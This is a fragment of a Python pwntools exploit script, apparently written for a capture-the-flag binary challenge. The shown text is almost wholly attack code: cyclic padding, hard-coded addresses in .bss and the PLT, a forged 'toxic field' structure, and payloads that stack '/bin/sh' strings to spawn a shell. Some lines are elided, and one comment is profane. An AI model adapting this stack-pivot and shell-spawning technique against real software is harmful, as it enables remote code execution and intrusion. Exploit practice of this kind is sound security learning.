...
def inject_toxic_feild():
    ...
    toxic_feild += p64(injectable + (0x18 * 2) + 0xd)
    toxic_feild += p64(0x40112a)

    toxic_feild += cyclic(0xc6 - 0x18 - 4 + 7  - (8 * 3))
...
def exploit():
    ...
    bss = 0x00404008
    plt = 0x401020
    total_injectable = bss - 32 + (0x730 - 0xc6)          # these are not the toxic feild, its shifted a bit to fucking save another address
                                                # real toxic feild will be in inject toxic feild
    # badtrip 0x4043a0
    pp.sendline(cyclic(13) + p64(bss + 0x400) + p64(main_stub))
    pp.sendline(cyclic(13) + p64(total_injectable + 0xd) + p64(main_stub) + (b"/bin/sh" * 100))
    payload = cyclic(13) + p64(bss - 8 + (0x730 - 0xc6)) + p64(0x401020) 
